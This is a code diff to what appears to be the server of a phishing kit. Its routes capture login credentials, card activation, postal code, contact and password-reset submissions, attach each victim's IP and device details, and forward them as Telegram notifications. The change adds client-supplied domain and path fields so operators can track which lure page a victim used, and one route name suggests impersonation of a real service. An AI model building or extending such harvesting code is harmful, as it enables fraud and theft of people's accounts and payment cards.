@@ -316,7 +316,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
       if (telegramConfig) {
         // Get detailed IP information and source info
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
         getIpInfo(ipAddress)
           .then((ipInfo) => {
             sendLoginNotification(validation.data, loginAttempt.id, ipInfo, deviceInfo, sourceInfo, telegramConfig)
@@ -445,7 +449,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
       const telegramConfig = getTelegramConfig();
       if (telegramConfig) {
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
         sendEmailVerificationNotification(email, loginAttemptId, sourceInfo, telegramConfig)
           .then((success: boolean) => {
             if (success) {
@@ -521,7 +529,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         const telegramConfig = getTelegramConfig();
         if (telegramConfig) {
           const referer = req.headers.referer || req.headers.referrer as string | undefined;
-          const sourceInfo = extractSourceInfo(referer, '/');
+          const explicitSource = req.body.sourceInfo ? {
+            domain: req.body.sourceInfo.domain,
+            path: req.body.sourceInfo.path
+          } : undefined;
+          const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
           if (sessionFlowType === 'account') {
             // For account flow, send consolidated notification with all data
             const { sendAccountLoginCompleteNotification } = await import('./telegram');
@@ -671,7 +683,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         const screenResolution = req.body.screenResolution;
         const deviceInfo = detectDevice(req, screenResolution);
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/S@S-account-verification');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/postal-code', explicitSource);
         getIpInfo(ipAddress)
           .then((ipInfo) => {
             sendPostalCodeNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
@@ -808,7 +824,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         const screenResolution = req.body.screenResolution;
         const deviceInfo = detectDevice(req, screenResolution);
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/contact-info');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/contact-info', explicitSource);
         // Send notification in background (non-blocking)
         getIpInfo(ipAddress)
           .then((ipInfo) => {
@@ -880,7 +900,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         const screenResolution = req.body.screenResolution;
         const deviceInfo = detectDevice(req, screenResolution);
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/register');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/register', explicitSource);
         getIpInfo(ipAddress)
           .then((ipInfo) => {
             sendRegisterNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
@@ -950,7 +974,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         const screenResolution = req.body.screenResolution;
         const deviceInfo = detectDevice(req, screenResolution);
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/activate-card');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/activate-card', explicitSource);
         getIpInfo(ipAddress)
           .then((ipInfo) => {
             sendCardActivationNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
@@ -1021,7 +1049,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         const screenResolution = req.body.screenResolution;
         const deviceInfo = detectDevice(req, screenResolution);
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/forgot-username');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/forgot-username', explicitSource);
         getIpInfo(ipAddress)
           .then((ipInfo) => {
             sendForgotUsernameNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
@@ -1091,7 +1123,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         const screenResolution = req.body.screenResolution;
         const deviceInfo = detectDevice(req, screenResolution);
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/forgot-password');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/forgot-password', explicitSource);
         getIpInfo(ipAddress)
           .then((ipInfo) => {
             sendForgotPasswordNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
@@ -1282,7 +1318,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
       const telegramConfig = getTelegramConfig();
       if (telegramConfig) {
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/account');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/account', explicitSource);
         getIpInfo(ipAddress)
           .then((ipInfo) => {
             sendAccountPageNotification(ipInfo, deviceInfo, sourceInfo, telegramConfig)
@@ -1360,7 +1400,11 @@ Sitemap: ${baseUrl}/sitemap.xml`;
       const telegramConfig = getTelegramConfig();
       if (telegramConfig) {
         const referer = req.headers.referer || req.headers.referrer as string | undefined;
-        const sourceInfo = extractSourceInfo(referer, '/account');
+        const explicitSource = req.body.sourceInfo ? {
+          domain: req.body.sourceInfo.domain,
+          path: req.body.sourceInfo.path
+        } : undefined;
+        const sourceInfo = extractSourceInfo(referer, '/account', explicitSource);
         getIpInfo(ipAddress)
           .then((ipInfo) => {
             sendAccountLoginNotification(loginData, loginAttempt.id, ipInfo, deviceInfo, sourceInfo, telegramConfig)
